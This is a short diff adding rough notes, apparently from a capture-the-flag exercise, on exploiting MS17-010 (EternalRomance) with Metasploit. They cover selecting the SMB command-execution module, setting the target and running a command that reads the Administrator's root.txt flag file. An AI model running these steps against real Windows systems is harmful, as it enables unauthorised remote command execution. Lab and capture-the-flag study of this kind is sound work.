@@ -1,0 +1,9 @@
+Network Intelligence and compromise of Windows machines 
+ms17-10 is a remote exploits against microsoft windows 
+open msfconsole and search for it 
+use auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 
+
+set rhosts to target ip 
+set command cmd.exe /c type C:\\Users\\Administrator\\Desktop\\root.txt
+
+run/exploits
